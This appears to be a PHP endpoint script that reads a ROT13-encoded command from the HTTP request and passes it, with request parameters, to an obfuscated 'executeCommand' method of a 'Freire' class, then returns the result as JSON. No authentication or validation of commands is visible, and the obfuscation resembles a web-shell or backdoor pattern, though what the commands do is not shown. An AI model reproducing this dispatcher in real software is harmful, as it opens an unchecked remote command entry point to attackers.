<?php include_once 'common.php';
Session::start();
if (!empty($_REQUEST['form'])) {
    $command = str_rot13($_REQUEST['command']);
    $server = new Freire();
    $data = $server->rkrphgrPbzznaq($command, $_REQUEST);
    print json_encode($data);
} else {
    $obj = new stdClass();
    $obj->id = $_REQUEST['id'];
    $obj->command = str_rot13($_REQUEST['command']);
    $obj->params = (array) json_decode($_REQUEST['params']);
    include_once 'Freire.php';
    $server = new Freire();
    $data = $server->rkrphgrPbzznaq($obj->command, $obj->params);
    $response = new stdClass();
    $response->id = $obj->id;
    $data->history_data = isset($_REQUEST['history_data']) ? $_REQUEST['history_data'] : '';
    $response->data = $data;
    print json_encode($response);
} ?>